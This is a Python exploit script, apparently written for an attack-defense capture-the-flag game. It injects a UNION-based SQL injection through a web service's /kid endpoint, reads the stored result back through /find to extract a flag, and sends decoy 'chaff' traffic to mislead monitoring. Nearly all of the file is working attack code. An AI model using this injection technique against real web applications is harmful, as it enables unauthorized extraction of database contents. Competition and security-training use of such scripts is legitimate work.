#!/usr/bin/env python
from Base_Exploit import Exploit
from pwn import *
import requests

FLAG = r'FLG[0-9A-Za-z]{13}'
TIMEOUT = 5.0
#example Exploit3
class Exploit3(Exploit):
    def __init__(self, ip, port,flagid, name="", debug=False, debug_chaff=False):
        super().__init__(ip, port,flagid, name, debug, debug_chaff)

    def launch_exploit(self):
        kid_url =  f'http://{self.ip}:10003/kid'
        find_url = f'http://{self.ip}:10003/find'
        sql_injection = f"%' UNION SELECT description AS data from parties where id={self.flagId}; --"
        self.dprint(f'query:{sql_injection}')
        kid_payload = {'first': 'test1', 'last': sql_injection, 'age': 10}
        try:
            # Insert sql injection 
            self.dprint(f'Send request to: {find_url}')
            response = wget(kid_url, params=kid_payload)
            response = response.decode('utf-8') 
            self.dprint(response)
            if response:
                kid_id = response.split()[2]            
                self.dprint(kid_id)
                find_payload = {'kid': kid_id}
            # Find kid using the inserted value
            if find_payload:
                self.dprint(f'Send request to: {find_url}')            
                find_response = wget(find_url, params=find_payload)
                if find_response:
                    find_response = find_response.decode('utf-8') 
                    self.dprint(f'received:{find_response}')    
                    match = re.search(FLAG, find_response)
                    if match:
                        print(f'FLG: {match.group(0)}')
                        return match.group(0) 
            return None    
        except Exception as e:
            self.dprint(e)
            return None
        
    def launch_chaff(self):
        msg = "%' JOIN SELECT description AS data from parties where description=" + self.name 
        self.dprint(msg)
        self.write_file(msg)
        self.send(msg,self.sock)

   


